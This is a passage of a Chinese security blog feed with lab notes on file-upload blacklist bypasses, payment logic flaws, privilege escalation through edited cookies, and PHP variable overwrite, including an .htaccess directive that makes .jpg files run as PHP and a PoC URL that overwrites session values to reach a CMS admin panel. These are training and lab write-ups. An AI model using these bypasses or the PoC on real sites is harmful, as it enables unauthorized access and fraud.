src="http://m.qpic.cn/psb?/V133mrMy3dol57/mEWjMDZU2Q7YDuklJEEfcKIcukqlBjU8U*FNNsBltTw!/b/dDIBAAAAAAAA&amp;bo=VAXJAlQFyQIRGS4!&amp;rf=viewer_4" alt><br>.htaccess是什么？.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或者多个指令的文件，以作用于此目录及其所有子目录。<br>.htaccess功能：<br>文件密码保护，用户自定义重定向，自定义404页面，扩展名伪静态化，禁止特定ip地址的用户，但这个功能默认是不开启的。</p><p>.htaccess中有一条指令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>这个指令代表着.jpg文件会当做php来解析。</p><p>只要我们把带有这条指令的.htaccess配置文件上传上去到有黑名单拦截的上传点，那就意味着我们就能将图片马直接上传上去了！</p><p>图形化界面是不允许我们将文件命名为空文件名 .htaccess，所以这里通过cmd命令来进行重命名：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*Z8xWXTZLwkgcga9IhymWx*oWoG6MnmR9M.DajlIFl8!/b/dE0BAAAAAAAA&amp;bo=WwTQAlsE0AIRGS4!&amp;rf=viewer_4" alt><br>成功命名，<br>我们接下来，只需要先将.htaccess配置文件先传上去，在将图片马传上去即可；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/QjmHLIRy7nOP*i6x2BoPnYS58mG3WipMkEMJnsztUyk!/b/dLYAAAAAAAAA&amp;bo=gAfcA4AH3AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="5-后缀大小写绕过"><a href="#5-后缀大小写绕过" class="headerlink" title="5.后缀大小写绕过"></a>5.后缀大小写绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/NsiHDYDfN.Hj.9yD1bRwXVg.UMyHnH6x.WU0p0PPKtY!/b/dFMBAAAAAAAA&amp;bo=YAXIAmAFyAIRCT4!&amp;rf=viewer_4" alt></p><p>在这里，虽然使用了很多过滤，过滤了很多文件类型，但却没将文件后缀统一转化为小写，所以我们是能通过后缀大小写来绕过上传的：</p><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/yOlNuyZEw.zicCi8Edmbs5BKc1fH.HnwoPjmqQwes4Q!/b/dFMBAAAAAAAA&amp;bo=ZwCCAGcAggARGS4!&amp;rf=viewer_4" alt></p><p>我们将做成图片马直接将后缀改成Php，进行上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRGS4!&amp;rf=viewer_4" alt></p><h2 id="6-文件后缀（空）绕过"><a href="#6-文件后缀（空）绕过" class="headerlink" title="6.文件后缀（空）绕过"></a>6.文件后缀（空）绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ctpzNLW1hvfPIv.T4z0Dkrsak5SyY67FtTJu8nlEkzQ!/b/dDQBAAAAAAAA&amp;bo=ZwXFAmcFxQIRCT4!&amp;rf=viewer_4" alt></p><p>这里相对于前面关卡的代码是少了一个消除两旁空格的函数trim();所以我们我们可以通过在后缀加个空格尝试绕过，<strong>黑名单机制中，是不允许上传什么，但如果我们传上去的文件与所限制的稍有不一样，那是不是就可以直接绕过黑名单了</strong></p><p>我们进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/d*pCj2unPGzQ7rMhKzo8QEfPa7tBLtExl229Qs*79HE!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p>在后缀加个空格，上传</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRCT4!&amp;rf=viewer_4" alt></p><h2 id="7-文件后缀-点-绕过"><a href="#7-文件后缀-点-绕过" class="headerlink" title="7.文件后缀(点)绕过"></a>7.文件后缀(点)绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/m1IqTO83xMSNLK8m2qvEU8CwZUTsqPY3GoAIPB1aFdY!/b/dL8AAAAAAAAA&amp;bo=CQWAAmAFqwIRCXw!&amp;rf=viewer_4" alt><br>这里是少了一个删除末尾的点的函数</p><p>我们还是进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/qiENQR89aUzEeuVUhohrosTDte9YlnwFnZr1bGrfjko!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br>在后缀加个点，上传，在上传到服务器后，服务器会自动将点去掉，只读取前面有用的后缀；<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/synsgTwLVgNk6k9.rkhjouhz5iuujzkRNdYZALQkaCg!/b/dDcBAAAAAAAA&amp;bo=gAfbA4AH2wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="8-DATA（Windows文件流绕过）"><a href="#8-DATA（Windows文件流绕过）" class="headerlink" title="8.::$DATA（Windows文件流绕过）"></a>8.::$DATA（Windows文件流绕过）</h2><p>::$DATA（Windows文件流绕过）（这里利用到了NTFS交换数据流(ADS)，ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都存在许多个数据流。通俗理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿问文件。）</p><p>例如在cmd命令下运行：echo abcd&gt;&gt;a.txt:b.txt 很明显生成一个a.txt，但是会是空值，因为系统将值写到寄宿文件上去了；</p><p>然后再运行 echo 123&gt;&gt;a.txt::$DATA，是会在a.txt中输出123的，因为<br>::$DATA相当是个空值，不是一个寄宿文件，所以还是会将文件写入到a.txt中去，不修改文件存储过程；</p><p>在利用Windows特性，可在后缀加上“ ::$DATA ”绕过。<br>跟之前一样的思路，抓包改包绕过。<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZxgolmKjvTPXMgVANvNagukSCz3aQqzZw.zzqXbcpS4!/b/dEgBAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/.jYmXUYDdeLg0syadDStJOYrClaPTtwNCJ92IdU5zYs!/b/dLYAAAAAAAAA&amp;bo=fgfSA34H0gMRCT4!&amp;rf=viewer_4" alt></p><h2 id="9-构造文件后缀绕过"><a href="#9-构造文件后缀绕过" class="headerlink" title="9.构造文件后缀绕过"></a>9.构造文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/u0nPUSpkCll3GfBBIDmRopaaxgVdUrxPl0kX1o15lXo!/b/dMAAAAAAAAAA&amp;bo=awXNAmsFzQIRCT4!&amp;rf=viewer_4" alt><br>第九关好像用了我们前面关卡的所有过滤，那我们可不可以构造一个文件名后缀111.php. . 过滤参数在发现.时会将.去掉，在将空格去掉，最后只剩下111.php. 这样还是可以绕过黑名单机制的，因为111.php.不等于111.php，所以还是能绕过上传；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/b3gpzQ8zgA4BwI3BdF4*1rxQ4lONy3af9pXegTyO3Gg!/b/dLgAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="10双写文件后缀绕过"><a href="#10双写文件后缀绕过" class="headerlink" title="10双写文件后缀绕过"></a>10双写文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ypZhRcfDvAhSB.SfJLlAWG2DK8tmHOECM2ZWrfGyWtU!/b/dIQAAAAAAAAA&amp;bo=agUEAmoFBAIRCT4!&amp;rf=viewer_4" alt></p><p>会将符合条件的文件后缀删除，我们只需要将文件后缀进行双写，令他删除后合并就能成功绕过！</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/4OigHcJUMtz6dSWTiGju0oMns0AxY1eM0u*O.o.QG7E!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/LG5JK1ZorQZBrglBO1UAbGKez.B5lgA3DPErpWLP77M!/b/dDcBAAAAAAAA&amp;bo=cgfWA3IH1gMRCT4!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞</title>
      <link href="/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知</p><h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性</p><h3 id="服务端异步通知"><a href="#服务端异步通知" class="headerlink" title="服务端异步通知"></a>服务端异步通知</h3><p>该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用post或get的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额，订单信息是否与发起支付时一致，验证正常则对定单进行状态处理或为用户进行网站内入账等。</p><p>该漏洞属于逻辑漏洞的一种，需要靠不一样的思维，来进行逻辑绕过。</p><p>##常见支付漏洞<br>支付步骤：————订购、订单、付款</p><p>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可以在最后一步富矿石进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p><ul><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0112258.html" target="_blank" rel="noopener">修改支付金额案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">修改支付状态案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0108134.html" target="_blank" rel="noopener">修改订单数量案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0139556.html" target="_blank" rel="noopener">修改附属值案例</a></p></li></ul><p>优惠券其基本都是优惠一半，一般用优惠券进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p><p>越权支付<br>存在user=id(123)，这种传参时，尝试改id，尝试用别人的钱包买自己的物品</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0188155.html" target="_blank" rel="noopener">无限制试用案例</a><br>比如试用的参数为2，正常购买的参数为1<br>那么我们购买参数为2(试用)，会发生什么呢？</p><h2 id="支付漏洞-挖掘"><a href="#支付漏洞-挖掘" class="headerlink" title="支付漏洞(挖掘)"></a>支付漏洞(挖掘)</h2><ul><li><strong>找到关键的数据包</strong><br>可能支付操作有三四个数据包，我们要对数据进行挑选。</li><li><strong>分析数据包</strong><br>支付数据包中会包含很多的敏感信息(账号，金额，余额，优惠)，要擦尝试对数据包中的各个参数进行分析</li><li><strong>不按套路出牌</strong><br>多去想想开发想不到的地方<br>pc端尝试过，wap端也看看，app也试试</li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、后端检查每一项值，包括支付状态。</p><p>2、校验价格、数量参数，比如产品数量只能为整数，并限制购买数量</p><p>3、与第三方支付平台检查，实际支付的金额是否与订单一致。</p><p>4、对支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</p><p>5、金额超过一定值，进行人工审核</p><p>6、限制用户对商品的支付次数</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>找到了一个很辣眼睛的CMS<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujelhkej31h90p8gud.jpg" alt><br>我们先进行注册用户<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujv998nj31h90ilwkt.jpg" alt><br>我们点击商品中心<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uuk97z1bj31hc0oa10b.jpg" alt><br>发现他的购买数量没进行限制，还可以填入负数，这就连传包的力气都省… 那我们填入-10000试试<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uukm40dfj31ha0o9qa7.jpg" alt><br>提交<br> 发现报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uullzk2dj31gt0q0q5j.jpg" alt><br>我们先不管，先返回看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uul2tmojj31hc0nuq9d.jpg" alt><br>我们发现我账户余额多了92000块</p><hr><p>我搜到一篇文章，我觉得总结的挺好的，推荐一下：<a href="https://secpulse.com/archives/67080.html" target="_blank" rel="noopener">挖洞技巧：支付漏洞之总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>平行越权、垂直越权</title>
      <link href="/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="越权漏洞描述"><a href="#越权漏洞描述" class="headerlink" title="越权漏洞描述"></a>越权漏洞描述</h2><p>越权访问，这类漏洞是指应用在检查授权(Authorization)时存在纰漏，使得攻击者在获得低权限用户帐后后，可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在着两种越权操作类型：横向越权操作(平行越权)和纵向越权操作(垂直越权)。</p><ul><li><strong>水平越权漏洞</strong>，是一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人而导致的越权数据访问漏洞。如服务器端从客户端提交的request参数(用户能够控制的数据)中获取用户id，恶意攻击者通过变换请求ID的值，查看或修改不属于本人的数据。</li><li><strong>垂直越权漏洞</strong>，也称为权限提升，是一种“基于URL的访问控制”设计缺陷引起的漏洞。由于Web应用程序没有做权限控制或者仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn5h46bnj30ty0fggno.jpg" alt></li></ul><p>我们可以这么说<strong>把握住传参就能把握住逻辑漏洞的命脉</strong>，其实渗透测试也是同一道理，漏洞是不会无缘无故产生。</p><h3 id="越权思路"><a href="#越权思路" class="headerlink" title="越权思路"></a>越权思路</h3><p>登入用户A，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试(当然如果可以影响到更高权限的用户就是垂直越权漏洞)</p><p>传参ID参数需要自己检测(常见：uid= id= user= 等)通常使用brup进行爆破传参(传参可能在GET POST COOKIE中)</p><p>常见的平行越权(不需要输入原密码的修改密码，抓包该改用户或者用户ID修改他人密码)进行查看订单信息，遍历订单id等。</p><h3 id="越权漏洞实例与类型"><a href="#越权漏洞实例与类型" class="headerlink" title="越权漏洞实例与类型"></a>越权漏洞实例与类型</h3><ol><li>通过修改GET传参来越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0205340.html" target="_blank" rel="noopener">GET越权实例</a></li><li>修改POST传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0207583.html" target="_blank" rel="noopener">POST越权实例</a></li><li>修改cookie传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0184633.html" target="_blank" rel="noopener">COOKIE越权实例</a></li></ol><p>还有一类叫做<strong>未授权访问</strong>，严格意义上而言这个不属于越权漏洞，但是在日常的测试中常常会遇见</p><p>(只要<strong>输入正确对应身份的网址就可以直接访问</strong>，例如/admin默认是登录，登陆后跳转到user.php然后直接访问user.php，发现你直接有后台权限)</p><h2 id="靶场实际"><a href="#靶场实际" class="headerlink" title="靶场实际"></a>靶场实际</h2><p>靶场是一个很老的保修系统，虽然很老，但是还是有些网站还在使用(BWSsoft维修系统)<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn66xuz7j31h80pydo1.jpg" alt="2"><br>我们想要去做一个越权，那我们需要先有一个普通用户的使用权限，我们看到了注册按钮，于是我们进行了注册，获得了一个普通用户身份。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn6kpdp3j31hc0p2dnr.jpg" alt="3"><br>我们点击物品保修，并抓个包看看。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3snle4qokj30z40rkabo.jpg" alt="4"><br>我们发现cookie中存在登陆用户的信息传参，那我们是否能对其数据更改进行越权<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7bm6blj31a00mt0vp.jpg" alt="5"><br>我们看到admin=0，那管理员的admin传参是不是要等于1呢，我改了一下，但是没用，后面我看到了一个shenfen的传参，两个一起修改才有效呢，管理员的参数值一般为1(true)，那我们试一下。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7p34boj30v80oswhs.jpg" alt="6"><br>发现改完以后出现了后台管理的按钮<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn84pl6pj31hc0q2wmh.jpg" alt="7"><br>我们点击进去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn8f7fi1j31hc0hltak.jpg" alt="8"><br>发现成功进去后台。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="变量覆盖介绍"><a href="#变量覆盖介绍" class="headerlink" title="变量覆盖介绍"></a>变量覆盖介绍</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击；变量覆盖漏洞有时候可以直接让我们获取Webshell，拿到服务器权限； </p><p>经常导致变量覆盖漏洞场景有：<strong>$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。</strong></p><h2 id="变量覆盖函数解析"><a href="#变量覆盖函数解析" class="headerlink" title="变量覆盖函数解析"></a>变量覆盖函数解析</h2><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p>extract() 函数从数组中将变量导入到当前的符号表。<strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。具体函数介绍：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" title="具体函数介绍" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><p><strong>示例一：</strong></p><p>将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：$a = Cat; $b = Dog; $c = Horse</span><br></pre></td></tr></table></figure></p><p>成功将变量a覆盖</p><p><strong>示例二：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=1;  </span><br><span class="line">extract($_GET);</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br><span class="line">//提交：?id=123</span><br><span class="line">//结果： 123</span><br></pre></td></tr></table></figure><p>成功将变量id覆盖:</p><p><strong>extract()函数防御:</strong></p><p><strong>在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖  extract($_GET,EXTR_SKIP);</strong></p><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。用法参考：<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name=allblue&amp;age=18&quot;);</span><br><span class="line">echo $name  //输出allblue</span><br><span class="line">echo $age   //输出18</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>parse_str()函数防御:</strong><br>只能在传参前添加判断语句，判断变量是否存在；</p><p>tips：parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p><h3 id="导致变量覆盖问题"><a href="#导致变量覆盖问题" class="headerlink" title="$$导致变量覆盖问题"></a>$$导致变量覆盖问题</h3><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?id=2 会将$id的值覆盖，$id=2。</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=1;</span><br><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $request)&#123;</span><br><span class="line">foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line">echo $a;     //通过传入参数实现变量覆盖</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h3><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p><p>import_request_variables ( string $types , string $prefix )</p><p>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE.</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    </span><br><span class="line">import_request_variables(&apos;GP&apos;);   </span><br><span class="line">print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此页面当使用GET或POST传递$a变量时，会将原变量的值覆盖。</p><p>值得注意的是：此函数只能用在 PHP4.1 ~ PHP5.4之间。<br>此函数是非常危险的函数，在PHP5.5之后已被官方删除，假如你任然在使用低版本的PHP环境，也建议你避免使用此函数。</p><p>###全局变量覆盖<br>register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//?id=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;$id :&apos;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p><p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p><p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">if (ini_get(&apos;register_globals&apos;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);  </span><br><span class="line">print $a.&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">print $_GET[b];  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在register_globals=ON时,</p><p>提交/test.php?a=1&amp;b=2 , 变量$a未初始化,$_GET[b]=2</p><p>提交/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p><p>tips:　从 PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>靶场环境：Duomicmsx2.0；<br>审计工具：seay源码审计系统；<br>因为我们做的是变量覆盖的题目，所有我们先在seay源码审计系统加上一条匹配$$的正则匹配规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([^\$&quot;]|$)\$\&#123;?\$</span><br></pre></td></tr></table></figure></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd18kavzj31970nqwja.jpg" alt></p><p>通过审计工具的自动审计功能来审计可能存在的漏洞：</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1kgorfj31hc0smtlz.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1y1tssj31az0myajn.jpg" alt><br>最后寻找，发现了foreach和$$结合的变量覆盖漏洞</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd29fa65j319j0pyaga.jpg" alt></p><p>找到了文件覆盖，但是我们需要找到可以调用覆盖的地方，我们先搜索包含commond.php的文件，看看能不能在其关联的文件中找到可利用代码</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2k0sthj31ap0qwwl5.jpg" alt><br>最后我们找到一个包含了common.php和check.admin.php的文件login.php</p><p>我们发现check.admin.php是通过获取用户登录时的id来判断用户的权限，是不是管理员<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2vgj7aj31gw0sewo8.jpg" alt></p><p>而在admin.manager.php有一个判断，直接根据判断传进来的$groupid来进行身份验证。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd34m68bj31hc0smqb6.jpg" alt></p><p>如果传进来的session值为1，那么就是管理员的权限</p><p>通过构造POC使得duomi_group_id=1,就可以登录系统管理员，POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p>我们进去后台登录界面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3da67rj31hc0pv40b.jpg" alt><br>后台没有管路员密码登录不上<br>插入我们构造的POC：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3nw2muj31hb0r80u8.jpg" alt><br>插入成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3vn3gej31hc0pm76u.jpg" alt><br>进入后台页面，发现没密码，自动成功登录。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
